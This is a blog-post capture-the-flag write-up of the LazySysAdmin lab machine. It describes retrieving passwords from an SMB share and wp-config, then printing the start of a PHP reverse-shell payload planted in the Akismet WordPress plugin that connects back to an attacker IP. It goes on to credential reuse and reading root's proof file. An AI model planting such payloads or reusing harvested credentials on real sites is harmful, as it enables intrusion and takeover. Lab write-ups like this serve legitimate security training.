<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        LazySysAdmin Writeup ::
        H4cklife!! — No-life it
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Intro # TLDRs Start Here ⤵ # Having connected to the SMB share named share$, allowed for the wp-config file and several other files containing passwords to be retrieved.
The /wordpress/wp-config file revealed to following username and password combination:
/** * @package Akismet */ /* Plugin Name: Akismet Anti-Spam Plugin URI: https://akismet.com/ Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam."
/>
<meta
  name="keywords"
  content="Hacking"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/lazysysadmin-writeup/" />





<link rel="stylesheet" href="/assets/style.css" />

<link rel="stylesheet" href="/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="LazySysAdmin Writeup"/>
<meta name="twitter:description" content="Intro # TLDRs Start Here ⤵ # Having connected to the SMB share named share$, allowed for the wp-config file and several other files containing passwords to be retrieved.
The /wordpress/wp-config file revealed to following username and password combination:
/** * @package Akismet */ /* Plugin Name: Akismet Anti-Spam Plugin URI: https://akismet.com/ Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam."/>



<meta property="og:title" content="LazySysAdmin Writeup" />
<meta property="og:description" content="Intro # TLDRs Start Here ⤵ # Having connected to the SMB share named share$, allowed for the wp-config file and several other files containing passwords to be retrieved.
The /wordpress/wp-config file revealed to following username and password combination:
/** * @package Akismet */ /* Plugin Name: Akismet Anti-Spam Plugin URI: https://akismet.com/ Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/lazysysadmin-writeup/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-06-23T22:34:54-06:00" />
<meta property="article:modified_time" content="2019-06-23T22:34:54-06:00" /><meta property="og:site_name" content="H4cklife!!" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >H4cklife!!</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about/">About</a></li>
        
      
        
          <li><a href="/beefhook/">Beefhooks</a></li>
        
      
        
          <li><a href="/coalcast/">Coalcast!</a></li>
        
      
        
          <li><a href="/wallpapers/">Wallpapers</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about/">About</a></li>
      
    
      
        <li><a href="/beefhook/">Beefhooks</a></li>
      
    
      
        <li><a href="/coalcast/">Coalcast!</a></li>
      
    
      
        <li><a href="/wallpapers/">Wallpapers</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">LazySysAdmin Writeup</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2019-06-23
        </span>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 2 min read</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <h2 id="intro">
  Intro
  <a href="#intro" class="h-anchor" aria-hidden="true">#</a>
</h2>
<!-- raw HTML omitted -->
<h3 id="tldrs-start-here-">
  TLDRs Start Here ⤵
  <a href="#tldrs-start-here-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Having connected to the SMB share named share$, allowed for the <!-- raw HTML omitted -->wp-config<!-- raw HTML omitted --> file and several other files containing passwords to be retrieved.</p>
<p>The /wordpress/w<!-- raw HTML omitted -->p-config<!-- raw HTML omitted --> file revealed to following username and password combination:</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* @package Akismet
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Plugin Name: Akismet Anti-Spam
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Plugin URI: https://akismet.com/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Version: 3.3.3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Author: Automattic
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Author URI: https://automattic.com/wordpress-plugins/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">License: GPLv2 or later
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Text Domain: akismet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">This program is free software; you can redistribute it and/or
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">modify it under the terms of the GNU General Public License
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">as published by the Free Software Foundation; either version 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">of the License, or (at your option) any later version.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">This program is distributed in the hope that it will be useful,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">but WITHOUT ANY WARRANTY; without even the implied warranty of
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">GNU General Public License for more details.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">You should have received a copy of the GNU General Public License
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">along with this program; if not, write to the Free Software
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Copyright 2005-2015 Automattic, Inc.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.0.0.41&#39;</span>; <span style="color:#75715e">// CHANGE THIS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">443</span>; <span style="color:#75715e">// CHANGE THIS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
</span></span><span style="display:flex;"><span>$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; /bin/bash -i&#39;</span>;
</span></span><span style="display:flex;"><span>$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>$debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><p>Once the shell code was added the plugin was reactivated and a reverse shell connection was received.</p>
<!-- raw HTML omitted -->
<p>Now that a local connection has been established, the /etc/passwd file was read in order to see the local users on the target machine for possible attack trajectories to root.</p>
<!-- raw HTML omitted -->
<p>Next passwords that were enumerated earlier in the process are used to see if authentication to other users on the target machine is possible:</p>
<!-- raw HTML omitted -->
<p>Using the password enumerated from the deet.txt file during the SMB enumeration happened to be the login credentials for the user Togie!</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Below, the <!-- raw HTML omitted -->proof.txt<!-- raw HTML omitted --> was read from the /root/ directory validating that this machine has been exploited successfully:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@LazySysAdmin: cd /root
</span></span><span style="display:flex;"><span>cd /root
</span></span><span style="display:flex;"><span>root@LazySysAdmin: ls
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>proof.txt
</span></span><span style="display:flex;"><span>root@LazySysAdmin: cat proof.txt
</span></span><span style="display:flex;"><span>cat proof.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WX6k7NJtA8gfk*...redacted...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Well <span style="color:#66d9ef">done</span> :<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hope you learnt a few things along the way.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Regards,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Togie Mcdogie
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enjoy some random strings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WX6k7NJtA8gfk*w5J3&amp;amp;T@*Ga6!0o5UP89hMVEQPT9851
</span></span><span style="display:flex;"><span>2d2v.....redacted...
</span></span></code></pre></div><!-- raw HTML omitted -->

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/posts/windows-7-kiosk-escape/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Windows 7 Kiosk Escape</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/posts/a-pre-exam-for-future-oscp-students/">
                  <span class="button__text">A Pre-Exam For Future OSCP Students!</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        <script src="https://utteranc.es/client.js"
        repo="clutchisback1/h4cklife.org"
        issue-term="pathname"
        label="general-comment"
	theme="github-dark"
        crossorigin="anonymous"
        async>
</script>




<script>
"use strict";

!function() {
  var t = window.driftt = window.drift = window.driftt || [];
  if (!t.init) {
    if (t.invoked) return void (window.console && console.error && console.error("Drift snippet included twice."));
    t.invoked = !0, t.methods = [ "identify", "config", "track", "reset", "debug", "show", "ping", "page", "hide", "off", "on" ], 
    t.factory = function(e) {
      return function() {
        var n = Array.prototype.slice.call(arguments);
        return n.unshift(e), t.push(n), t;
      };
    }, t.methods.forEach(function(e) {
      t[e] = t.factory(e);
    }), t.load = function(t) {
      var e = 3e5, n = Math.ceil(new Date() / e) * e, o = document.createElement("script");
      o.type = "text/javascript", o.async = !0, o.crossorigin = "anonymous", o.src = "https://js.driftt.com/include/" + n + "/" + t + ".js";
      var i = document.getElementsByTagName("script")[0];
      i.parentNode.insertBefore(o, i);
    };
  }
}();
drift.SNIPPET_VERSION = '0.3.1';
drift.load('2pa2ip2k9udy');
</script>


      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">Copyright 2019 😜</div>
      
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
